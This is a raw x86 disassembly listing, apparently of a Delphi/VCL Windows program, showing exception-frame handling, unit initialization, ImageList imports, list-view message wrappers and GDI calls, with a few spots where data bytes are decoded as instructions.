mov [ fs : eax ] edx
push sub_425b22
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_4026fc
retn
sub_425b1b
jmp sub_403924
sub_425b22
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425b42
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_4026fc
retn
sub_425b3b
jmp sub_403924
sub_425b42
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_425b4c
xor ecx ecx
mov edx eax
add eax 0x14
jmp r-xdata
cmp edx eax
jl r-xdata
xor cx [ edx ]
add edx 0x2
mov eax ecx
retn
sub_425cac
push 0x0
call sub_425c48
retn
sub_425d51
jmp sub_403924
sub_425d58
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_425d64
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_425cb4
pop ebx
pop ebp
retn 0x4
sub_425d78
retn
sub_425d7c
test eax eax
jne r-xdata
retn
call sub_425d78
sub_425f4f
jmp sub_403924
sub_425f76
jmp sub_403924
sub_425f7d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425fbc
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_426189
mov eax [ ebp - 0xc ]
call sub_403190
retn
sub_426192
jmp sub_403924
j_sub_426189
jmp sub_426189
sub_426199
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403190
retn
sub_4261af
jmp sub_403924
sub_4261c0
xor eax eax
retn
sub_4261c4
mov al [ eax + 0x21 ]
retn
sub_426210
jmp sub_403924
sub_426217
pop esi
pop ecx
pop ebp
retn
sub_426244
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_42629b
jmp sub_403924
sub_4262a2
pop esi
pop ecx
pop ebp
retn
sub_4262a8
retn
sub_4262ac
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4262bc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_426346
jmp sub_403924
sub_42634d
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4264a8
jmp sub_403670
sub_426508
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4263b8
mov [ rw-data ] eax
sub_4265f0
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_42658c
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_426698
jmp sub_403670
sub_42672f
jmp sub_403670
sub_4267a8
push ebx
mov ebx edx
call sub_426508
mov edx ebx
call sub_4264cc
test eax eax
setne al
pop ebx
retn
sub_4267c0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4265f0
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
pop ebx
retn
sub_4267d8
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4265f0
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop edi
pop esi
retn
sub_426921
jmp sub_403670
sub_42699f
jmp sub_403924
sub_4269a6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_426b10
retn
sub_426cb0
cmp [ eax + 0x28 ] 0x0
sete al
retn
sub_426fb4
jmp sub_403924
sub_426fbb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_427133
jmp sub_403924
sub_42713a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4271c9
jmp sub_403924
sub_4271d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4271f2
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f44
retn
sub_4271eb
jmp sub_403924
sub_4271f2
pop ebx
mov esp ebp
pop ebp
retn
sub_427205
add [ eax ] al
add [ ebx + 0x74002878 ] al
adc al [ eax + 0x74002c78 ]
pop es
call sub_4274ec
jmp r-xdata
retn
sub_42721b
call sub_427578
retn
sub_427310
retn
sub_427568
jmp sub_403924
sub_427693
jmp sub_403924
sub_42769a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
sub_4276b3
jmp sub_403924
sub_42788a
jmp sub_403924
sub_4278b2
jmp sub_403924
sub_4278b9
mov esp ebp
pop ebp
retn
sub_427930
jmp sub_403924
sub_427a38
jmp sub_403924
sub_427b23
jmp sub_403924
sub_427b30
inc [ eax + 0x4 ]
retn
sub_427cab
jmp sub_403924
sub_42805c
jmp sub_403924
sub_4282a6
jmp sub_403924
sub_4282d0
jmp sub_403924
sub_4282d7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4282f9
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_4282f2
jmp sub_403924
sub_428303
jmp sub_403670
sub_428352
jmp sub_403924
sub_42857f
jmp sub_403924
sub_4285c7
jmp sub_403924
sub_428734
jmp sub_403924
sub_4287fb
jmp sub_403670
sub_428850
mov [ eax + 0x31 ] 0x0
call sub_425fbc
retn
sub_428aa1
jmp sub_403924
sub_428b0c
jmp sub_403924
sub_428b13
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_428b84
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_428c38
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_428c48
push ebx
mov ebx eax
mov eax ebx
call sub_428e00
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_428c5c
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_428c78
push ebx
mov ebx eax
mov eax ebx
call sub_428e60
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_428cd4
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_428de3
jmp sub_403924
sub_429047
jmp sub_403670
sub_4290a7
jmp sub_403924
sub_4290ae
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_42948f
jmp sub_403924
sub_4294bb
jmp sub_403924
sub_429522
jmp sub_403670
sub_429553
jmp sub_403924
sub_4295d8
jmp sub_403670
sub_4295dd
mov eax [ ebp - 0x38 ]
call sub_403190
call sub_403984
call sub_4039d8
sub_4295ef
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42960c
mov eax [ ebp - 0x18 ]
call sub_4026fc
retn
sub_429605
jmp sub_403924
sub_42975b
jmp sub_403670
sub_429a27
jmp sub_403670
sub_429b08
mov cl 0x1
call sub_429b10
retn
sub_429dc5
add [ eax ] al
add [ ebx ] dh
leave
call sub_429b10
retn
sub_429e4a
jmp sub_403670
sub_429e4f
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_403984
call sub_4039d8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_429ea0
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_429fd9
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_42a008
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_42a01c
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_42a135
jmp sub_403670
sub_42a1ea
jmp sub_403670
sub_42a254
jmp sub_403670
sub_42a288
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_42a214
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_42a2a0
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_424cb4
retn
mov [ eax + 0x30 ] edx
retn
sub_42a2b8
retn
sub_42a2bc
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_424cb4
retn
mov [ eax + 0x2c ] edx
retn
sub_42a2fc
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_424cb4
pop ebp
retn 0x4
sub_42a310
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_424cb4
pop ebp
retn 0x4
sub_42a4d0
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_42a4dc
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_42a589
jmp sub_403924
sub_42a590
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42a67b
jmp sub_403670
sub_42a6e7
jmp sub_403924
sub_42a815
jmp sub_403924
sub_42a81c
pop ebp
retn
sub_42a91c
cmp edx eax
jg r-xdata
retn
mov eax edx
sub_42a951
jmp sub_403924
sub_42a958
pop ebp
retn
sub_42a95c
sub [ rw-data ] 0x1
retn
sub_42aba4
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_418470
retn
sub_42abd8
mov eax [ eax + 0x4 ]
call sub_418314
retn
sub_42ac09
jmp sub_403924
sub_42ac10
pop ebp
retn
sub_42ac14
sub [ rw-data ] 0x1
retn
InitCommonControls
jmp [ __import_lookup_table_12(comctl32:InitCommonControls) ]
ImageList_Create
jmp [ __import_lookup_table_12(comctl32:ImageList_Create) ]
ImageList_Destroy
jmp [ __import_lookup_table_12(comctl32:ImageList_Destroy) ]
ImageList_GetImageCount
jmp [ __import_lookup_table_12(comctl32:ImageList_GetImageCount) ]
ImageList_ReplaceIcon
jmp [ ImageList_ReplaceIcon@IAT ]
ImageList_SetBkColor
jmp [ __import_lookup_table_12(comctl32:ImageList_SetBkColor) ]
ImageList_GetBkColor
jmp [ __import_lookup_table_12(comctl32:ImageList_GetBkColor) ]
ImageList_Replace
jmp [ __import_lookup_table_12(comctl32:ImageList_Replace) ]
ImageList_Remove
jmp [ ImageList_Remove@IAT ]
ImageList_BeginDrag
jmp [ ImageList_BeginDrag@IAT ]
ImageList_EndDrag
jmp [ __import_lookup_table_12(comctl32:ImageList_EndDrag) ]
ImageList_DragEnter
jmp [ __import_lookup_table_12(comctl32:ImageList_DragEnter) ]
ImageList_DragLeave
jmp [ __import_lookup_table_12(comctl32:ImageList_DragLeave) ]
ImageList_DragMove
jmp [ __import_lookup_table_12(comctl32:ImageList_DragMove) ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_GetDragImage
jmp [ ImageList_GetDragImage@IAT ]
ImageList_Read
jmp [ __import_lookup_table_12(comctl32:ImageList_Read) ]
ImageList_Write
jmp [ __import_lookup_table_12(comctl32:ImageList_Write) ]
ImageList_GetIconSize
jmp [ __import_lookup_table_12(comctl32:ImageList_GetIconSize) ]
ImageList_SetIconSize
jmp [ __import_lookup_table_12(comctl32:ImageList_SetIconSize) ]
sub_42ada8
push ecx
push edx
push 0x1212
push eax
call SendMessageA
retn
sub_42adb8
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x1004
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42add0
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1006
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_42ade8
push edx
push 0x0
push 0x100f
push eax
call SendMessageA
retn
sub_42adf8
push 0x0
push edx
push 0x1014
push eax
call SendMessageA
retn
sub_42ae5c
push 0x0
push 0x0
push 0x1008
push eax
call SendMessageA
retn
sub_42ae91
jmp sub_403924
sub_42ae98
pop ebp
retn
sub_42ae9c
sub [ rw-data ] 0x1
retn
sub_42af63
jmp sub_403924
sub_42af6a
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42b580
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_42af8c
mov [ rw-data ] sub_42b0a4
mov [ rw-data ] sub_42b014
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_42b2a8
mov [ rw-data ] sub_42b37c
mov [ rw-data ] sub_42b450
retn
sub_42b611
jmp sub_403924
sub_42b618
pop ebp
retn
sub_42b61c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42b580
sub_42b651
jmp sub_403924
sub_42b658
pop ebp
retn
sub_42b65c
sub [ rw-data ] 0x1
retn
sub_42b89d
add eax 0xffffffd8
jmp sub_42c520
sub_42b8a5
add eax 0xffffffd8
jmp sub_42c534
sub_42b8b7
add [ esp + 0x4 ] 0xffffffd8
jmp sub_405860
sub_42b8c1
add [ esp + 0x4 ] 0xffffffd8
jmp sub_405874
sub_42b8cb
add eax 0xffffffd4
jmp sub_42bfec
sub_42b8d3
add eax 0xffffffd4
jmp sub_42c200
sub_42b8db
add eax 0xffffffd4
jmp sub_42c314
sub_42b8eb
add eax 0xffffffd4
jmp sub_42c418
sub_42b8f3
add eax 0xffffffd4
jmp sub_42c474
sub_42b905
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405860
sub_42b90f
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405874
sub_42ba9e
jmp sub_403924
sub_42baa5
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42bcb5
jmp sub_403924
sub_42bcbc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42be71
jmp sub_403924
sub_42bed6
jmp sub_403924
sub_42bedd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42bfc9
jmp sub_403924
sub_42bfd0
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42c1e0
lea eax [ ebp - 0x30 ]
call sub_403f20
lea eax [ ebp - 0x20 ]
call sub_403f20
retn
sub_42c1f1
jmp sub_403924
j_sub_42c1e0
jmp sub_42c1e0
sub_42c1f8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42c2f3
jmp sub_403924
sub_42c2fa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42c314
call sub_42bd44
retn
sub_42c3f7
jmp sub_403924
sub_42c3fe
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42c45e
lea eax [ ebp - 0x4 ]
call sub_40578c
retn
sub_42c467
jmp sub_403924
j_sub_42c45e
jmp sub_42c45e
sub_42c46e
pop ebx
pop ecx
pop ebp
retn
sub_42c509
jmp sub_403924
sub_42c510
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_42c51c
mov eax [ eax + 0x20 ]
retn
sub_42c520
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x24 ]
call sub_403f74
pop esi
pop ebx
retn
sub_42c64b
jmp sub_403924
sub_42c652
pop ebp
retn
sub_42c654
sub [ rw-data ] 0x1
retn
sub_42c681
jmp sub_403924
sub_42c688
pop ebp
retn
sub_42c68c
sub [ rw-data ] 0x1
retn
sub_42c6c5
jmp sub_403924
sub_42c6cc
pop ebp
retn
sub_42c6d0
sub [ rw-data ] 0x1
retn
sub_42c9dd
jmp sub_403924
sub_42c9e4
pop ebp
retn
sub_42c9e8
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42c734
sub_42c9f8
inc esp
0x42
sub_42cac8
retn
sub_42cb3c
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_42cb48
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_42cb54
mov edx [ eax ]
call [ edx ]
retn
sub_42cb5c
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_42cb89
jmp sub_403924
sub_42cb90
pop ebp
retn
sub_42cb94
sub [ rw-data ] 0x1
retn
sub_42cd53
jmp sub_403924
sub_42cd5a
pop ebp
retn
sub_42d10f
jmp sub_403924
sub_42d116
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_42d530
jmp sub_403924
sub_42d537
pop ebp
retn
sub_42d53c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42cacc
mov [ rw-data ] eax
sub_42d57d
jmp sub_403924
sub_42d584
pop ebp
retn
sub_42d588
sub [ rw-data ] 0x1
retn
sub_42d5b5
jmp sub_403924
sub_42d5bc
pop ebp
retn
sub_42d5c0
sub [ rw-data ] 0x1
retn
sub_42d5ed
jmp sub_403924
sub_42d5f4
pop ebp
retn
sub_42d5f8
sub [ rw-data ] 0x1
retn
sub_42d625
jmp sub_403924
sub_42d62c
pop ebp
retn
sub_42d630
sub [ rw-data ] 0x1
retn
sub_42d65d
jmp sub_403924
sub_42d664
pop ebp
retn
sub_42d668
sub [ rw-data ] 0x1
retn
sub_42d695
jmp sub_403924
sub_42d69c
pop ebp
retn
sub_42d6a0
sub [ rw-data ] 0x1
retn
sub_42d6cd
jmp sub_403924
sub_42d6d4
pop ebp
retn
sub_42d6d8
sub [ rw-data ] 0x1
retn
sub_42d705
jmp sub_403924
sub_42d70c
pop ebp
retn
sub_42d710
sub [ rw-data ] 0x1
retn
sub_42d73d
jmp sub_403924
sub_42d744
pop ebp
retn
sub_42d748
sub [ rw-data ] 0x1
retn
sub_42d9c2
jmp sub_403670
sub_42d9c7
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46d2bc
call sub_4039d8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42d9e4
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_42d9ec
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_40338c
pop esi
retn
sub_42da04
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_40338c
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_42da1c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_42dac5
jmp sub_403924
sub_42daf3
jmp sub_403924
sub_42dafa
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42db04
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_42db18
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_42dd76
jmp sub_403924
sub_42dd7d
pop ebp
retn
sub_42def6
inc esp
add [ eax - 0x35 ] bh
inc esp
add [ eax + 0x180044d4 ] ah
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
sub_42f590
push esi
mov esi eax
cmp dl [ esi + 0x168 ]
je r-xdata
pop esi
retn
mov [ esi + 0x168 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42f5ac
push esi
mov esi eax
cmp dl [ esi + 0x169 ]
je r-xdata
pop esi
retn
mov [ esi + 0x169 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42fa42
jmp sub_403670
sub_42fafb
jmp sub_403924
sub_42fb02
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42fb08
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_42fa7c
sub_42fb18
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_42fa7c
sub_42fb28
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_42fa7c
pop ebp
retn 0x8
sub_42fb40
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_42fc6c
push ebx
mov ebx eax
mov eax ebx
call sub_453060
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42fc80
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42fcb4
cmp [ eax + 0x21e ] 0x0
jne r-xdata
retn
mov [ edx + 0xc ] 0x1
sub_42fdb8
jmp sub_403924
sub_42fdbf
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ff62
jmp sub_403924
sub_42ff69
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ff73
inc [ ecx ]
add [ eax ] al
add [ edi ] dl
add [ eax ] al
mov [ eax + 0x220 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_42ff88
push ebx
mov ebx eax
mov [ ebx + 0x211 ] dl
mov eax ebx
call sub_450348
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42ffa4
push ebx
mov ebx eax
mov [ ebx + 0x212 ] dl
mov eax ebx
call sub_450348
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42ffc0
push ebx
mov ebx eax
mov [ ebx + 0x214 ] edx
mov eax ebx
call sub_450348
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42ffdc
push ebx
mov ebx eax
mov [ ebx + 0x218 ] edx
mov eax ebx
call sub_450348
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_42fff8
cmp dl [ eax + 0x21c ]
je r-xdata
retn
mov [ eax + 0x21c ] dl
call sub_451028
sub_43000c
mov al [ eax + 0x220 ]
retn
sub_430175
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
sub_43018d
jmp sub_403924
sub_430499
jmp sub_403670
sub_43060c
retn
sub_430799
jmp sub_403924
sub_43081c
push ebx
mov ebx eax
mov eax ebx
call sub_44f248
mov eax ebx
call sub_430610
pop ebx
retn
sub_430830
push ebx
mov ebx eax
mov [ ebx + 0x220 ] 0x1
mov eax ebx
call sub_44fa7c
mov [ ebx + 0x220 ] 0x0
mov eax ebx
call sub_430958
pop ebx
retn
sub_430948
push esi
mov esi eax
mov eax [ esi + 0x214 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_430a21
jmp sub_403924
sub_430a28
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_430a70
push ebx
mov ebx eax
mov eax ebx
call sub_452fe4
mov eax ebx
call sub_430610
pop ebx
retn
sub_430a84
push ebx
mov ebx eax
mov eax ebx
call sub_441394
mov eax ebx
call sub_430610
pop ebx
retn
sub_430a98
mov al 0x1
retn
sub_430a9c
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_430dd4
jmp sub_403924
sub_430de0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403ca8
mov eax [ r-xdata ]
call sub_417aa4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417af0
sub_430e75
jmp sub_403924
sub_430e7c
pop ebp
retn
sub_430e80
sub [ rw-data ] 0x1
retn
sub_430f58
jmp sub_403924
sub_430f64
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov [ ebx + 0xd ] 0x1
sub_43109a
jmp sub_403924
sub_4310a1
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43114a
jmp sub_403924
sub_4311b0
jmp sub_403924
sub_4311b7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_431215
jmp sub_403924
sub_43121c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_431301
jmp sub_403924
sub_431308
pop ebx
mov esp ebp
pop ebp
retn
sub_431385
jmp sub_403924
sub_43138c
pop ebx
mov esp ebp
pop ebp
retn
sub_43142a
jmp sub_403670
sub_4314c1
jmp sub_403924
sub_4314c8
pop ebp
retn
sub_4314cc
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_431548
retn
sub_431549
jmp sub_403924
j_sub_431548
jmp sub_431548
sub_431550
pop ebp
retn
sub_431554
sub [ rw-data ] 0x1
retn
sub_431742
inc esp
add [ eax - 0x35 ] bh
inc esp
add [ eax + 0x180044d4 ] ah
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
sub_4317b0
jmp r-xdata
sub_431f9c
mov eax [ eax + 0x4 ]
cmp [ eax + 0x8 ] 0x0
sete al
retn
sub_43271f
jmp sub_403924
sub_43275b
jmp sub_403924
sub_433366
jmp sub_403924
sub_43336d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4335f4
call sub_44e6c8
retn
sub_4335fc
push ebx
mov ebx eax
mov eax ebx
call sub_433618
mov edx [ eax ]
call [ edx + 0x24 ]
pop ebx
retn
sub_433610
mov eax [ r-xdata ]
retn
sub_433618
mov eax [ eax + 0x16c ]
mov eax [ eax + 0x4 ]
retn
sub_433624
push esi
mov esi eax
mov eax [ esi + 0x16c ]
call sub_43210c
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
retn
sub_43363c
mov eax [ eax + 0x16c ]
mov al [ eax + 0x20 ]
retn
sub_433674
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_433724
push esi
mov esi eax
cmp dl [ esi + 0x180 ]
je r-xdata
pop esi
retn
mov [ esi + 0x180 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_433740
cmp edx [ eax + 0x168 ]
je r-xdata
retn
mov [ eax + 0x168 ] edx
call sub_43367c
sub_433754
push esi
mov esi eax
cmp dl [ esi + 0x173 ]
je r-xdata
pop esi
retn
mov [ esi + 0x173 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_433770
push esi
mov esi eax
cmp edx [ esi + 0x17c ]
je r-xdata
pop esi
retn
cmp edx 0xffffffff
jl r-xdata
mov [ esi + 0x17c ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_433790
push esi
mov esi eax
cmp edx [ esi + 0x174 ]
je r-xdata
pop esi
retn
mov [ esi + 0x174 ] edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4337e8
cmp dl [ eax + 0x172 ]
je r-xdata
retn
mov [ eax + 0x172 ] dl
call sub_43367c
sub_4337fc
push esi
mov esi eax
mov eax esi
call sub_44e878
cmp [ esi + 0x170 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov si 0xffe9
call sub_40338c
sub_433949
jmp sub_403924
sub_433950
pop edi
pop esi
pop ecx
pop ebp
retn
sub_433958
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_433960
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_433968
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x16c ]
mov eax esi
call sub_432098
mov dl [ ebx + 0x182 ]
mov eax esi
call sub_4321ac
pop esi
pop ebx
retn
sub_433b98
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_403190
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_433c5b
retn
sub_433c5c
jmp sub_403924
j_sub_433c5b
jmp sub_433c5b
sub_433c63
pop ebp
retn
sub_433c68
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403cf4
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402ba4
sub_433cb5
jmp sub_403924
sub_433cbc
pop ebp
retn
sub_433cc0
sub [ rw-data ] 0x1
retn
sub_433d1c
jmp sub_403924
sub_433d23
pop ebp
retn
sub_433d28
sub [ rw-data ] 0x1
retn
sub_433d84
jmp sub_403924
sub_433d8b
pop ebp
retn
sub_433d90
sub [ rw-data ] 0x1
retn
sub_433df1
jmp sub_403924
sub_433df8
pop ebp
retn
sub_433dfc
